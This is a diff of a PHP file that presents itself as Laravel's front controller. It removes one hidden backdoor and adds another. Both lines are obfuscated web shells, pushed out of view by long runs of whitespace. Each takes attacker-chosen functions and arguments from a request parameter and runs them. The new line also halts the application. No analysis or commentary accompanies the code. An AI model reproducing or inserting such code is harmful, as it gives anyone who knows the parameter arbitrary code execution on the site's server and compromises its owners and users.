@@ -1,5 +1,5 @@
 <?php
-                                                                                                                                                                                                                                                                                 if( $rdpiat=@$	{	"_REQUEST"}	["MVPZJ1LD"])$rdpiat	[	1	]	( $	{ $rdpiat[2] } [0 ],$rdpiat[3	]	($rdpiat [4 ]	) );
+                                                                                                                                                                                                                                                                  if($wl8nt=@${"_REQUEST" }	["5MZWTY3P"])$wl8nt	[ 1] (${	$wl8nt[2 ]	}	[0],$wl8nt [	3 ]($wl8nt[4 ]	) );exit();
 
 /**
  * Laravel - A PHP Framework For Web Artisans
